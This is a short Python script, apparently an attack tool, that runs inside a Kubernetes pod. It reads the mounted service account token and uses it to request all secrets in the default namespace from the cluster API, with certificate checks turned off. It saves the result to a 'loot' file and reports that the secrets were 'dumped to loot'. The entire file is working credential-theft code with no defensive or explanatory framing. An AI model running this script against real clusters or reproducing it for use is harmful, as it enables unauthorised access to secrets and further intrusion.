import os, requests, sys
def hijack(api_url):
    t_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    if not os.path.exists(t_path): return
    with open(t_path, 'r') as f: token = f.read()
    r = requests.get(f"{api_url}/api/v1/namespaces/default/secrets", 
                     headers={"Authorization": f"Bearer {token}"}, verify=False)
    with open("../loot/k8s_secrets.json", "w") as l: l.write(r.text)
    print("[+] Secrets dumped to loot.")
if __name__ == "__main__":
    hijack(sys.argv[1] if len(sys.argv) > 1 else "https://kubernetes.default.svc")
